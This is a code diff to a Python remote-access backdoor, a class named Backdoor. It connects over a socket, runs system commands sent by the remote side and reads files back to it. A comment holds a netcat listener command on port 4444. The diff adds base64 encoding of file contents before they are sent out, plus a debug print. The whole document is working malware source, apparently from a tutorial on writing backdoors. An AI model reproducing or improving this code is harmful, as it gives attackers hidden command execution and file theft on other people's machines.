@@ -2,6 +2,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 
 # nc -vv -l -p 4444
@@ -39,7 +40,7 @@ class Backdoor:
 
     def read_file(self, path):
         with open(path, 'rb') as file:
-            return file.read()
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
@@ -54,6 +55,7 @@ class Backdoor:
                 command_result = self.read_file(command[1])
             else:
                 command_result = self.execute_system_command(command) 
+            print(command_result)
             self.reliable_send(command_result)
         
 
